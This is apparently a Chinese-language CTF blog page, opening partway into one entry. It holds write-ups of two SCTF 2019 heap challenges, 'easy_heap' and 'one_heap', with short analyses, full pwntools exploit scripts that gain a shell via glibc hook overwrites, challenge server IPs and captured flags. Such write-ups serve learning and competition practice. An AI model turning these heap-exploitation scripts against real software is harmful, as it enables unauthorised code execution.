<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Arch:</span>     amd64<span class="number">-64</span>-little</span><br><span class="line"><span class="symbol">RELRO:</span>    Full RELRO</span><br><span class="line"><span class="symbol">Stack:</span>    Canary found</span><br><span class="line"><span class="symbol">NX:</span>       NX enabled</span><br><span class="line"><span class="symbol">PIE:</span>      PIE enabled</span><br></pre></td></tr></table></figure>
<p>&#x7A0B;&#x5E8F;&#x6709;&#x4E09;&#x4E2A;&#x529F;&#x80FD;&#xFF0C;&#x6CA1;&#x6709;show&#x529F;&#x80FD;</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Mmap: 0x3ce4166000</span><br><span class="line">ESAY_HEAP @ SCTF2019</span><br><span class="line"></span><br><span class="line">1. Alloc</span><br><span class="line">2. Delete</span><br><span class="line">3. Fill</span><br><span class="line">4. Exit</span><br><span class="line">&gt;&gt; 1 </span><br><span class="line">Size: 20</span><br><span class="line">chunk at [0] Pointer<span class="built_in"> Address </span>0x555555756068</span><br></pre></td></tr></table></figure>
<p>&#x7A0B;&#x5E8F;&#x81EA;&#x5DF1;&#x63D0;&#x4F9B;mmap&#x7533;&#x8BF7;&#x7684;&#x5185;&#x5B58;&#x968F;&#x673A;&#x5730;&#x5740;&#x548C;bss&#x6BB5;&#x4FDD;&#x5B58;&#x5806;&#x6307;&#x9488;&#x7684;&#x5730;&#x5740;</p>
<p>free&#x540E;&#x4F1A;&#x6E05;&#x7A7A;&#x6307;&#x9488;&#xFF0C;&#x4F46;&#x662F;&#x7F16;&#x8F91;&#x529F;&#x80FD;fill&#x5B58;&#x5728;\x00&#x4E00;&#x5B57;&#x8282;&#x6EA2;&#x51FA;</p>
<h2 id="0x01-&#x5229;&#x7528;&#x5206;&#x6790;"><a href="#0x01-&#x5229;&#x7528;&#x5206;&#x6790;" class="headerlink" title="0x01 &#x5229;&#x7528;&#x5206;&#x6790;"></a>0x01 &#x5229;&#x7528;&#x5206;&#x6790;</h2><p>&#x5229;&#x7528;&#x5806;&#x91CD;&#x53E0;&#x548C;parrial overwrite&#xFF0C;&#x4FEE;&#x6539;fastbin chunk&#x7684;fd&#x6307;&#x9488;&#xFF0C;&#x5728; <code>_IO_2_1_stdout_</code> &#x4E0A;&#x65B9;&#x7684;&#x9519;&#x4F4D;&#x5730;&#x5740;&#x5206;&#x914D;&#x4E00;&#x4E2A;&#x5927;&#x5C0F;&#x4E3A;0x7f&#x7684;chunk&#xFF0C;&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x6D41;&#x6570;&#x636E;&#xFF0C;&#x6CC4;&#x9732;libc</p>
<p>&#x518D;&#x6B21;&#x5229;&#x7528;fastbin attack&#x5728; <code>__malloc_hook</code> &#x4E0A;&#x5206;&#x914D;0x7f&#x5927;&#x5C0F;&#x7684;chunk&#xFF0C;one_gadget&#x6765;&#x83B7;&#x53D6;shell&#xFF0C;&#x4E0D;&#x8FC7;&#x4E2D;&#x95F4;&#x4F7F;&#x7528;&#x4E86; <code>__realloc_hook</code>&#x62AC;&#x6808;</p>
<h2 id="0x02-EXP"><a href="#0x02-EXP" class="headerlink" title="0x02 EXP"></a>0x02 EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">LOCAL = <span class="number">0</span> </span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">	p = process(<span class="string">&apos;./easy_heap&apos;</span>)</span><br><span class="line">	libc = ELF(<span class="string">&apos;./loc_libc.so.6&apos;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">&apos;132.232.100.67&apos;</span>,<span class="number">10004</span>)</span><br><span class="line">	libc = ELF(<span class="string">&apos;libc.so.6&apos;</span>)</span><br><span class="line">context.log_level = <span class="string">&apos;debug&apos;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;&gt;&gt; &apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;1&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Size: &apos;</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">        p.recvuntil(<span class="string">&apos;&gt;&gt; &apos;</span>)</span><br><span class="line">        p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&apos;Index: &apos;</span>)</span><br><span class="line">        p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,con)</span>:</span></span><br><span class="line">        p.recvuntil(<span class="string">&apos;&gt;&gt; &apos;</span>)</span><br><span class="line">        p.sendline(<span class="string">&apos;3&apos;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&apos;Index: &apos;</span>)</span><br><span class="line">        p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Content: &apos;</span>)</span><br><span class="line">	p.sendline(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span><span class="params">(s = <span class="string">&apos;&apos;</span>)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> s:</span><br><span class="line">		gdb.attach(p,s)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		gdb.attach(p)</span><br><span class="line">		raw_input(<span class="string">&apos;test&apos;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	add(<span class="number">0xf8</span>)<span class="comment">#0</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;chunk at [0] Pointer Address &apos;</span>)</span><br><span class="line">	p_base = int(p.recvline(),<span class="number">16</span>)<span class="number">-8</span><span class="number">-0x202060</span></span><br><span class="line">	log.info(<span class="string">&apos;p_base:&apos;</span>+hex(p_base))</span><br><span class="line">	add(<span class="number">0x61</span>)<span class="comment">#1</span></span><br><span class="line">	add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">	add(<span class="number">0xf8</span>)<span class="comment">#3</span></span><br><span class="line">	add(<span class="number">0xf8</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">	dele(<span class="number">0</span>)</span><br><span class="line">	edit(<span class="number">2</span>,<span class="string">&apos;\x00&apos;</span>*<span class="number">0x60</span>+p64(<span class="number">0x100</span>+<span class="number">0x70</span>+<span class="number">0x70</span>))</span><br><span class="line">	dele(<span class="number">3</span>)</span><br><span class="line">	dele(<span class="number">1</span>)</span><br><span class="line">	add(<span class="number">0xf8</span>)<span class="comment">#0 alert 1 fd</span></span><br><span class="line">	dele(<span class="number">0</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#freed 013</span></span><br><span class="line">	add(<span class="number">0x2d0</span>)<span class="comment">#0</span></span><br><span class="line">	edit(<span class="number">0</span>,<span class="string">&apos;\x00&apos;</span>*<span class="number">0xf8</span>+p64(<span class="number">0x71</span>)+<span class="string">&apos;\xdd\x25&apos;</span>)<span class="comment">#_IO_2_1_stderr_+157 0x7f</span></span><br><span class="line">	add(<span class="number">0x60</span>)<span class="comment">#1</span></span><br><span class="line">	add(<span class="number">0x60</span>)<span class="comment">#3</span></span><br><span class="line">	edit(<span class="number">3</span>,<span class="string">&apos;\x00&apos;</span>*(<span class="number">0x30</span>+<span class="number">3</span>)+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&apos;\x48&apos;</span>)</span><br><span class="line">	libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&apos;\x00&apos;</span>))-libc.symbols[<span class="string">&apos;_IO_2_1_stdout_&apos;</span>]<span class="number">-132</span></span><br><span class="line">	log.info(<span class="string">&apos;libc_base: &apos;</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">	dele(<span class="number">0</span>)</span><br><span class="line">	dele(<span class="number">1</span>)</span><br><span class="line">	add(<span class="number">0x2d0</span>)<span class="comment">#0</span></span><br><span class="line">	edit(<span class="number">0</span>,<span class="string">&apos;\x00&apos;</span>*<span class="number">0xf8</span>+p64(<span class="number">0x71</span>)+p64(libc_base+libc.symbols[<span class="string">&apos;__malloc_hook&apos;</span>]<span class="number">-0x23</span>))</span><br><span class="line">	add(<span class="number">0x60</span>)<span class="comment">#1</span></span><br><span class="line">	add(<span class="number">0x60</span>)<span class="comment">#5</span></span><br><span class="line">	one = libc_base+<span class="number">0xf1147</span></span><br><span class="line">	edit(<span class="number">5</span>,<span class="string">&apos;\x00&apos;</span>*(<span class="number">0x8</span>+<span class="number">3</span>)+p64(one)+p64(libc_base+libc.symbols[<span class="string">&apos;__libc_realloc&apos;</span>]))</span><br><span class="line"></span><br><span class="line">	<span class="comment">#q(&apos;b *&apos;+hex(libc_base+0xf1147))</span></span><br><span class="line">	<span class="comment">#q(&apos;b __libc_realloc&apos;)</span></span><br><span class="line">	<span class="comment">#q(&apos;catch syscall execve&apos;)</span></span><br><span class="line">	add(<span class="number">30</span>)</span><br><span class="line">	log.info(<span class="string">&apos;libc_base:&apos;</span>+hex(libc_base))</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		pwn()</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">if</span> LOCAL:</span><br><span class="line">        		p = process(<span class="string">&apos;./easy_heap&apos;</span>)</span><br><span class="line">        		libc = ELF(<span class="string">&apos;./loc_libc.so.6&apos;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">        		p = remote(<span class="string">&apos;132.232.100.67&apos;</span>,<span class="number">10004</span>)</span><br><span class="line">        		libc = ELF(<span class="string">&apos;libc.so.6&apos;</span>)</span><br><span class="line"><span class="comment">#sctf{4110c_D3l37_Fi11_r3pe7}</span></span><br></pre></td></tr></table></figure>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/06/25/2019-SCTF-one_heap/">2019-SCTF-one_heap[tcache的counts中存在的数据类型判断漏洞]</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-06-25</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/heap/">heap</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/tcache/">tcache</a></span><div class="content"><p>SCTF&#x8DDF;&#x7740;Koo&#x5E08;&#x5085;&#x5B66;&#x4E60;&#x4E00;&#x6CE2;&#xFF0C;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#x5B66;&#x5230;&#x7684;&#x65B0;&#x4E1C;&#x897F;</p>
<h2 id="0x00-tcache&#x7684;counts&#x4E2D;&#x5B58;&#x5728;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x5224;&#x65AD;&#x6F0F;&#x6D1E;"><a href="#0x00-tcache&#x7684;counts&#x4E2D;&#x5B58;&#x5728;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x5224;&#x65AD;&#x6F0F;&#x6D1E;" class="headerlink" title="0x00 tcache&#x7684;counts&#x4E2D;&#x5B58;&#x5728;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x5224;&#x65AD;&#x6F0F;&#x6D1E;"></a>0x00 tcache&#x7684;counts&#x4E2D;&#x5B58;&#x5728;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x5224;&#x65AD;&#x6F0F;&#x6D1E;</h2><p>&#x5728;tcache&#x6D89;&#x53CA;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x4E2D;</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">} tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
<p>counts&#x5B9A;&#x4E49;&#x4E3A;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x6570;&#x7EC4;&#xFF0C;&#x8BB0;&#x5F55;&#x6BCF;&#x4E2A;tcache&#x94FE;&#x4E2D;tcache&#x7684;&#x6570;&#x91CF;&#xFF0C;&#x5728;C&#x8BED;&#x8A00;&#x4E2D;&#x5E76;&#x6CA1;&#x6709;char&#x7C7B;&#x578B;&#x7684;&#x5E38;&#x91CF;&#xFF08;&#x4F46;&#x662F;&#x5728;C++&#x4E2D;&#x5374;&#x6709;&#xFF0C;&#x5B57;&#x7B26;&#x5E38;&#x91CF;&#x90FD;&#x662F;char&#x7C7B;&#x578B;&#xFF09;&#xFF0C;&#x5176;&#x5B9E;&#x662F;&#x7528;int&#x8868;&#x793A;char&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x4E2A;counts&#x662F;&#x4E00;&#x4E2A;&#x6709;&#x7B26;&#x53F7;&#x6574;&#x578B;&#x53D8;&#x91CF;(-128~127)</p>
<p>&#x5728;int_free&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x628A;chunk&#x653E;&#x5165;tcache&#x65F6;&#xFF0C;&#x4F1A;&#x5224;&#x65AD;&#x5F85;&#x653E;&#x5165;&#x7684;tcache&#x94FE;&#x662F;&#x5426;&#x5C0F;&#x4E8E;mp_.tcache_count&#xFF0C;&#x4E00;&#x822C;&#x4E3A;7</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">  {</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  }</span><br></pre></td></tr></table></figure>
<p>&#x67E5;&#x770B;&#x6E90;&#x7801;&#xFF0C;tcache_count&#x662F;&#x4E00;&#x4E2A;size_t&#x7C7B;&#x578B;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x65E0;&#x7B26;&#x53F7;&#x957F;&#x6574;&#x578B;&#xFF0C;&#x90A3;&#x4E48;&#x4E0A;&#x8FF0;&#x7684;&#x5224;&#x65AD;&#x5C31;&#x53D8;&#x4E3A; <strong>int&#x578B;&#x7684;counts &#x662F;&#x5426;&#x5C0F;&#x4E8E;unsigned long int&#x578B;&#x7684;tcache_count</strong> &#xFF0C;&#x5C31;&#x4F1A;&#x628A;counts&#x53D8;&#x91CF;&#x8F6C;&#x4E3A;&#x65E0;&#x7B26;&#x53F7;&#x7684;&#x957F;&#x6574;&#x578B;&#x8FDB;&#x884C;&#x6BD4;&#x8F83;</p>
<p>&#x5982;&#x679C;&#x6B64;&#x65F6;&#x7684;counts&#x5927;&#x5C0F;&#x4E3A;-1(0xff)&#xFF0C;&#x88AB;&#x8F6C;&#x6210;&#x65E0;&#x7B26;&#x53F7;&#x7684;&#x957F;&#x6574;&#x578B;&#x540E;&#x5C31;&#x53D8;&#x6210;255(0xff)&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4F1A;&#x4F7F;&#x4E0A;&#x8FF0;&#x5224;&#x65AD;&#x5931;&#x6548;&#xFF0C;&#x5728;tcache&#x7684;counts&#x53D8;&#x6210;-1&#x540E;&#xFF0C;&#x5C31;&#x4F1A;&#x5C06;&#x4E4B;&#x540E;free&#x7684;chunk&#xFF0C;&#x653E;&#x5165;unsortedbin&#x4E2D;</p>
<p>&#x6709;&#x4EC0;&#x4E48;&#x7528;&#x5462;&#xFF1F;</p>
<p>&#x5F53;&#x6211;&#x4EEC;double free&#x4E00;&#x4E2A;chunk&#x540E;&#xFF0C;tcache&#x4F1A;&#x7684;&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x81EA;&#x6211;&#x5FAA;&#x73AF;&#x7684;&#x94FE;&#x8868;&#xFF0C;tcache&#x7684;counts&#x662F;2</p>
<p><img src="/2019/06/25/2019-SCTF-one_heap/image-20190625164845982.png" alt="image-20190625164845982"></p>
<p>&#x8FDE;&#x7EED;&#x7533;&#x8BF7;&#x4E24;&#x6B21;&#x540E;&#xFF0C;counts&#x4F1A;&#x53D8;&#x6210;0</p>
<p><img src="/2019/06/25/2019-SCTF-one_heap/image-20190625164941616.png" alt="image-20190625164941616"></p>
<p>&#x518D;&#x7533;&#x8BF7;&#x4E00;&#x6B21;&#x540E;&#xFF0C;&#x53D1;&#x73B0;&#x5176;counts&#x53D8;&#x6210;&#x4E86;0xff&#xFF0C;&#x6B64;&#x65F6;&#x518D;&#x6B21;free&#x8BE5;chunk&#xFF0C;chunk&#x5C31;&#x4F1A;&#x8FDB;&#x5165;unsortedbin&#x4E2D;</p>
<p><img src="/2019/06/25/2019-SCTF-one_heap/image-20190625165039690.png" alt="image-20190625165039690"></p>
<h2 id="0x01-&#x7A0B;&#x5E8F;&#x5206;&#x6790;"><a href="#0x01-&#x7A0B;&#x5E8F;&#x5206;&#x6790;" class="headerlink" title="0x01 &#x7A0B;&#x5E8F;&#x5206;&#x6790;"></a>0x01 &#x7A0B;&#x5E8F;&#x5206;&#x6790;</h2><p>2.27&#x7248;&#x672C;&#x7684;libc&#xFF0C;&#x4FDD;&#x62A4;&#x5168;&#x5F00;</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Arch:</span>     amd64<span class="number">-64</span>-little</span><br><span class="line"><span class="symbol">RELRO:</span>    Full RELRO</span><br><span class="line"><span class="symbol">Stack:</span>    Canary found</span><br><span class="line"><span class="symbol">NX:</span>       NX enabled</span><br><span class="line"><span class="symbol">PIE:</span>      PIE enabled</span><br><span class="line"><span class="symbol">FORTIFY:</span>  Enabled</span><br></pre></td></tr></table></figure>
<p>&#x7A0B;&#x5E8F;&#x6709;&#x4E24;&#x4E2A;&#x529F;&#x80FD;&#xFF1A;1. new 2. delete</p>
<p>delete&#x65F6;&#x53EA;&#x80FD;free&#x6700;&#x8FD1;&#x4F7F;&#x7528;&#x7684;chunk&#xFF0C;&#x4E14;free&#x540E;&#x6CA1;&#x6709;&#x6E05;&#x7A7A;&#x6307;&#x9488;</p>
<p>&#x7A0B;&#x5E8F;&#x552F;&#x4E00;&#x96BE;&#x70B9;&#x662F;&#x53EA;&#x80FD;free4&#x6B21;</p>
<h2 id="0x02-&#x5229;&#x7528;&#x5206;&#x6790;"><a href="#0x02-&#x5229;&#x7528;&#x5206;&#x6790;" class="headerlink" title="0x02 &#x5229;&#x7528;&#x5206;&#x6790;"></a>0x02 &#x5229;&#x7528;&#x5206;&#x6790;</h2><p>1&#x3001;double free tcache&#xFF0C;patrial overwrite main_arena&#x7684;&#x5730;&#x5740;&#xFF0C;&#x5C06;tcache&#x7684;fd&#x6307;&#x9488;&#x6307;&#x5411; <code>_IO_2_1_stdout_</code> &#x6587;&#x4EF6;&#x6D41;&#xFF0C;&#x4FEE;&#x6539;flags&#x548C;write_base&#xFF0C;&#x6CC4;&#x9732;libc&#x5730;&#x5740;</p>
<p>2&#x3001;&#x518D;&#x6B21;double free tcache&#xFF0C;&#x56E0;&#x4E3A;&#x76F4;&#x63A5;&#x4F7F;&#x7528;one_gadget&#x56E0;&#x4E3A;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x95EE;&#x9898;&#xFF0C;&#x4E0D;&#x80FD;getshell&#xFF0C;&#x6240;&#x4EE5;&#x5148;&#x5C06;tcache&#x7684;fd&#x6307;&#x9488;&#x6539;&#x5199;&#x4E3A; <code>__realloc_hook</code> &#x5730;&#x5740;&#xFF0C;&#x56E0;&#x4E3A;<code>__malloc_hook</code> &#x548C; <code>__realloc_hook</code> &#x5730;&#x5740;&#x76F8;&#x90BB;&#xFF0C;&#x6240;&#x4EE5;&#x6539;&#x5199; <code>__realloc_hook</code> &#x5185;&#x5BB9;&#x4E3A;one_gadget&#xFF0C;&#x6539;&#x5199; <code>__malloc_hook</code> &#x5185;&#x5BB9;&#x4E3A; <code>__libc_realloc</code> &#x51FD;&#x6570;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x8FD9;&#x6837;&#x7A0B;&#x5E8F;&#x8C03;malloc&#x65F6;&#xFF0C;&#x5C31;&#x4F1A;&#x8C03;&#x7528; <code>__libc_realloc</code> &#xFF0C;&#x8BE5;&#x51FD;&#x6570;&#x62AC;&#x6808;&#xFF08;push&#x64CD;&#x4F5C;&#xFF09;&#x540E;&#xFF0C;&#x4F1A;&#x8C03;&#x7528;  <code>__realloc_hook</code> &#x4E2D;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5199;&#x5165;&#x7684;gadgets</p>
<h2 id="0x03-EXP"><a href="#0x03-EXP" class="headerlink" title="0x03 EXP"></a>0x03 EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&quot;./one_heap&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;47.104.89.129&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content=<span class="string">&quot;\n&quot;</span>)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size&quot;</span>,str(size))</span><br><span class="line">	<span class="keyword">if</span> size:</span><br><span class="line">		p.sendafter(<span class="string">&quot;content&quot;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">()</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    raw_input(<span class="string">&apos;test&apos;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	add(<span class="number">0x7f</span>)</span><br><span class="line">	dele()</span><br><span class="line">	dele()</span><br><span class="line">	add(<span class="number">0x3f</span>,(p64(<span class="number">0x90</span>)+p64(<span class="number">0x20</span>))*<span class="number">3</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">	dele()</span><br><span class="line">	add(<span class="number">0x7f</span>)</span><br><span class="line">	add(<span class="number">0x7f</span>)</span><br><span class="line">	add(<span class="number">0x7f</span>)</span><br><span class="line">	dele()</span><br><span class="line">	add(<span class="number">0x20</span>,<span class="string">&quot;\x50\xf7\n&quot;</span>)<span class="comment">#1</span></span><br><span class="line">	add(<span class="number">0x7f</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">0x28</span>+p64(<span class="number">0x91</span>)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">	add(<span class="number">0x7f</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&quot;\x90\n&quot;</span>)</span><br><span class="line">	libc_base=<span class="number">0</span></span><br><span class="line">	libc_base=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>,timeout=<span class="number">0.3</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">&apos;\0&apos;</span>))<span class="number">-0x3ec7e3</span></span><br><span class="line">	success(<span class="string">&quot;libc base :&quot;</span>+hex(libc_base))</span><br><span class="line">	add(<span class="number">0x7f</span>,<span class="string">&apos;\x00&apos;</span>*<span class="number">0x60</span>+p64(libc_base+libc.symbols[<span class="string">&apos;__realloc_hook&apos;</span>])+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">	add(<span class="number">0x3f</span>)</span><br><span class="line">	add(<span class="number">0x3f</span>,p64(libc_base+<span class="number">0x4f2c5</span>)+p64(libc_base+libc.symbols[<span class="string">&apos;__libc_realloc&apos;</span>]+<span class="number">2</span>)+<span class="string">&apos;\n&apos;</span>)</span><br><span class="line">	add(<span class="number">0x50</span>,<span class="string">&apos;aaaa&apos;</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		pwn()</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		p.close()</span><br><span class="line">		p=remote(<span class="string">&quot;47.104.89.129&quot;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sctf{TCAch3_So000o0o_3asY}</span></span><br></pre></td></tr></table></figure>
